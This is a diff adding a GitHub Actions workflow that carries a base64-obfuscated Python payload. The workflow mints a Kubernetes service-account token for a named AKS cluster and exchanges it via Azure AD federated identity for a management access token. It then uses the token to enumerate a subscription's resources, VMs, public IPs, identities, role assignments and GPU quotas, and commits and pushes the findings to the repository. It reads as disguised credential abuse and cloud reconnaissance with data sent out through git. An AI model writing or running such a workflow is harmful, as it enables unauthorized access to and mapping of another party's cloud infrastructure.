@@ -1,0 +1,40 @@
+name: ulinv
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+  id-token: write
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: i
+        run: |
+          set +e
+          curl -sL -o /tmp/kubectl https://dl.k8s.io/release/v1.30.5/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl
+          echo 'aW1wb3J0IG9zLGpzb24sdXJsbGliLnJlcXVlc3QsdXJsbGliLnBhcnNlLGJhc2U2NCxyZQpUPW9zLmVudmlyb25bJ1RPSyddOyBTPScxZjk5MzQ3ZS0zNmM4LTQ1MTItYWQzMC1mNjM4YThkODQ4OWYnCm9zLm1ha2VkaXJzKCd1bC9pbnYnLGV4aXN0X29rPVRydWUpCmRlZiBjYWxsKG1ldGhvZCx1LGJvZHk9Tm9uZSk6CiAgICBoPXsnQXV0aG9yaXphdGlvbic6J0JlYXJlciAnK1R9CiAgICBkPU5vbmUKICAgIGlmIGJvZHkgaXMgbm90IE5vbmU6CiAgICAgICAgZD1qc29uLmR1bXBzKGJvZHkpLmVuY29kZSgpOyBoWydDb250ZW50LVR5cGUnXT0nYXBwbGljYXRpb24vanNvbicKICAgIHI9dXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1LGRhdGE9ZCxoZWFkZXJzPWgsbWV0aG9kPW1ldGhvZCkKICAgIHRyeToKICAgICAgICB4PXVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocix0aW1lb3V0PTYwKTsgcmV0dXJuIHguZ2V0Y29kZSgpLHgucmVhZCgpLmRlY29kZSgpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgdHJ5OiByZXR1cm4gZ2V0YXR0cihlLCdjb2RlJywwKSxlLnJlYWQoKS5kZWNvZGUoKQogICAgICAgIGV4Y2VwdDogcmV0dXJuIDAsJ0VSUiAnK3N0cihlKQpkZWYgZ2V0KHUsdGFnKToKICAgIGMsYj1jYWxsKCdHRVQnLHUpCiAgICBvcGVuKCd1bC9pbnYvJXMuanNvbicldGFnLCd3Jykud3JpdGUoYikKICAgIHByaW50KCcjIycsdGFnLGMsbGVuKGIpKQogICAgcmV0dXJuIGMsYgpCPSdodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tJwpnZXQoQisnL3N1YnNjcmlwdGlvbnMvJytTKyc/YXBpLXZlcnNpb249MjAyMi0xMi0wMScsJ3N1YicpCmMsYj1nZXQoQisnL3N1YnNjcmlwdGlvbnMvJytTKycvcmVzb3VyY2Vncm91cHM/YXBpLXZlcnNpb249MjAyMS0wNC0wMScsJ3JncycpCnRyeToKICAgIHByaW50KCdSR1MnLFtyWyduYW1lJ10gZm9yIHIgaW4ganNvbi5sb2FkcyhiKS5nZXQoJ3ZhbHVlJyxbXSldKQpleGNlcHQ6IHBhc3MKYyxiPWdldChCKycvc3Vic2NyaXB0aW9ucy8nK1MrJy9yZXNvdXJjZXM/YXBpLXZlcnNpb249MjAyMS0wNC0wMScsJ2FsbHJlcycpCnRyeToKICAgIHY9anNvbi5sb2FkcyhiKS5nZXQoJ3ZhbHVlJyxbXSkKICAgIHByaW50KCdBTExSRVMgY291bnQnLGxlbih2KSkKICAgIGZvciByIGluIHY6CiAgICAgICAgbj0oci5nZXQoJ25hbWUnKSBvciAnJykubG93ZXIoKTsgdHk9ci5nZXQoJ3R5cGUnLCcnKQogICAgICAgIGlmIHJlLnNlYXJjaChyJ2gxMDB8Z3B1fG5jXGR8bmRcZHxudlxkfHVsLXxwcm9iZXxqdXB5dGVyfHJheXxjb21meXx2bXNzfHZpcnR1YWxtYWNoaW5lcycsbit0eS5sb3dlcigpKTogcHJpbnQoJyBISVQnLHR5LHIuZ2V0KCduYW1lJyksci5nZXQoJ2xvY2F0aW9uJykpCiAgICBwcmludCgnVFlQRVMnLHNvcnRlZChzZXQoci5nZXQoJ3R5cGUnLCcnKSBmb3IgciBpbiB2KSlbOjQwXSkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOiBwcmludCgnYWxscmVzIHBhcnNlJyxlKQpmb3IgdGFnLHUgaW4gWygndm1zcycsJy9zdWJzY3JpcHRpb25zLycrUysnL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZVNjYWxlU2V0cz9hcGktdmVyc2lvbj0yMDI0LTExLTAxJyksCiAgICAgICAgICAgICAgKCd2bXMnLCcvc3Vic2NyaXB0aW9ucy8nK1MrJy9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzP2FwaS12ZXJzaW9uPTIwMjQtMTEtMDEnKSwKICAgICAgICAgICAgICAoJ3BpcHMnLCcvc3Vic2NyaXB0aW9ucy8nK1MrJy9wcm92aWRlcnMvTWljcm9zb2Z0Lk5ldHdvcmsvcHVibGljSVBBZGRyZXNzZXM/YXBpLXZlcnNpb249MjAyNC0wNS0wMScpLAogICAgICAgICAgICAgICgnYWtzJywnL3N1YnNjcmlwdGlvbnMvJytTKycvcHJvdmlkZXJzL01pY3Jvc29mdC5Db250YWluZXJTZXJ2aWNlL21hbmFnZWRDbHVzdGVycz9hcGktdmVyc2lvbj0yMDI0LTA5LTAxJyksCiAgICAgICAgICAgICAgKCd1YW1pcycsJy9zdWJzY3JpcHRpb25zLycrUysnL3Byb3ZpZGVycy9NaWNyb3NvZnQuTWFuYWdlZElkZW50aXR5L3VzZXJBc3NpZ25lZElkZW50aXRpZXM/YXBpLXZlcnNpb249MjAyNC0xMS0zMCcpLAogICAgICAgICAgICAgICgncmEnLCcvc3Vic2NyaXB0aW9ucy8nK1MrJy9wcm92aWRlcnMvTWljcm9zb2Z0LkF1dGhvcml6YXRpb24vcm9sZUFzc2lnbm1lbnRzP2FwaS12ZXJzaW9uPTIwMjItMDQtMDEmJGZpbHRlcj1wcmluY2lwYWxJZCUyMGVxJTIwJTI3MWJlZDc1ZjEtZmVhZS00YTJhLWFkZTUtMmNiZGYwOTRiNDU3JTI3JyldOgogICAgYyxiPWdldChCK3UsdGFnKQogICAgdHJ5OgogICAgICAgIHY9anNvbi5sb2FkcyhiKS5nZXQoJ3ZhbHVlJyxbXSkKICAgICAgICBwcmludCgnICcsdGFnLCdjb3VudCcsbGVuKHYpLFsgKHguZ2V0KCduYW1lJykseC5nZXQoJ2xvY2F0aW9uJykpIGZvciB4IGluIHZdWzoxNV0pCiAgICAgICAgaWYgdGFnPT0ncGlwcyc6CiAgICAgICAgICAgIGZvciB4IGluIHY6CiAgICAgICAgICAgICAgICBpcD14LmdldCgncHJvcGVydGllcycse30pLmdldCgnaXBBZGRyZXNzJykKICAgICAgICAgICAgICAgIGlmIGlwOiBwcmludCgnICBQSVAnLHguZ2V0KCduYW1lJyksaXApCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6IHByaW50KCcgJyx0YWcsJ3BhcnNlJyxlLGJbOjE1MF0pCmZvciBsb2MgaW4gWydlYXN0dXMnLCdzd2VkZW5jZW50cmFsJywnd2VzdHVzMycsJ2Vhc3R1czInLCd3ZXN0ZXVyb3BlJ106CiAgICBjLGI9Z2V0KEIrJy9zdWJzY3JpcHRpb25zLycrUysnL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS9sb2NhdGlvbnMvJytsb2MrJy91c2FnZXM/YXBpLXZlcnNpb249MjAyNC0wNy0wMScsJ3VzZ18nK2xvYykKICAgIHRyeToKICAgICAgICB2PWpzb24ubG9hZHMoYikuZ2V0KCd2YWx1ZScsW10pCiAgICAgICAgZm9yIHUgaW4gdjoKICAgICAgICAgICAgbj11WyduYW1lJ11bJ3ZhbHVlJ10KICAgICAgICAgICAgaWYgcmUuc2VhcmNoKHInTkN8TkR8TlZ8SDEwMHxBMTAwfEdQVScsbixyZS5JKTogcHJpbnQoJyAgVVNHJyxsb2Msbix1WydjdXJyZW50VmFsdWUnXSwnLycsdVsnbGltaXQnXSkKICAgIGV4Y2VwdDogcGFzcwpwcmludCgnPT0gZG9uZScpCg==' | base64 -d > /tmp/inv.py; wc -c /tmp/inv.py
+          K=ul/kc/all-datapath.yaml
+          KX="/tmp/kubectl --kubeconfig $K --request-timeout=20s"
+          A=$($KX --context aks-g42us-tfdemo-staging-datapath-swedencentral create token control-sync-apply -n wallet-billing --audience api://AzureADTokenExchange --duration 3600s 2>/dev/null)
+          echo "alen=${#A}"
+          CID=c436a85b-f27b-4701-8bee-78b0c2a378cf
+          TOK=$(CID="$CID" ASSERTION="$A" python3 -c "
+import os,json,urllib.request,urllib.parse
+cid=os.environ['CID'];a=os.environ['ASSERTION']
+d=urllib.parse.urlencode({'client_id':cid,'client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':a,'scope':'https://management.azure.com/.default','grant_type':'client_credentials'}).encode()
+r=urllib.request.urlopen(urllib.request.Request('https://login.microsoftonline.com/62974d97-13b6-40c9-8576-f1ab2905b6cf/oauth2/v2.0/token',data=d,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=40)
+print(json.loads(r.read())['access_token'])
+")
+          echo "toklen=${#TOK}"
+          echo "$TOK" > /tmp/tok.txt
+          TOK="$TOK" python3 /tmp/inv.py 2>&1 | tee ul/inv/run.txt
+      - name: commit
+        if: always()
+        run: |
+          set +e
+          mkdir -p ul/inv
+          git add -A
+          git -c user.email=a@b -c user.name=ul commit -m "ulinv $(date -u +%s)"
+          git push
